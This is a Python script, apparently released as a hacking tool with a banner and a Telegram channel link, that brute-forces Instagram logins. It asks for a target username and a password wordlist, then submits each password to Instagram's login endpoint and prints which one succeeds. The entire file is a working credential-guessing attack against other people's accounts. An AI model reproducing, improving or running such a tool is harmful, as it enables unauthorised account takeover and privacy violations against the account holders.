import requests
import webbrowser
webbrowser.open('https://t.me/sorgu101')
def brute_force(kullanici_adi, sifre):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'x-csrftoken': 'x-csrftoken',
    }
    veri = {
        'username': kullanici_adi,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{sifre}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    session = requests.Session()
    session.headers.update(headers)
    cevap = session.post(url, data=veri)
    if 'authenticated' in cevap.text:
        print(f'\033[92mDoğru Şifre! Kullanıcı Adı: {kullanici_adi}, Şifre: {sifre}\033[0m')
    else:
        print(f'\033[91mYanlış Şifre! Kullanıcı Adı: {kullanici_adi}, Şifre: {sifre}\033[0m')

# tool By royz insta exe.royz
print("\033[96m" + r"""
  ____   _____   _______  ____  ____  _   _ _____ _____ 
 |  _ \ / _ \ \ / /__  / | __ )|  _ \| | | |_   _| ____|
 | |_) | | | \ V /  / /  |  _ \| |_) | | | | | | |  _|  
 |  _ <| |_| || |  / /_  | |_) |  _ <| |_| | | | | |___ 
 |_| \_\\___/ |_| /____| |____/|_| \_\\___/  |_| |_____|
 t.me/sorgu101           insta exe.royz                 3.0
                         
""" + "\033[93m")

kullanici_adi = input('Hedef Instagram kullanıcı adını girin: ')
sifre_dosyasi = input('Şifre dosyasının yolunu girin: ')

try:
    with open(sifre_dosyasi, 'r') as dosya:
        sifre_listesi = dosya.read().splitlines()
except FileNotFoundError:
    print('\033[91m"Şifre dosyası bulunamadı!')
    exit()
# tool By royz insta exe.royz
for sifre in sifre_listesi:
    brute_force(kullanici_adi, sifre)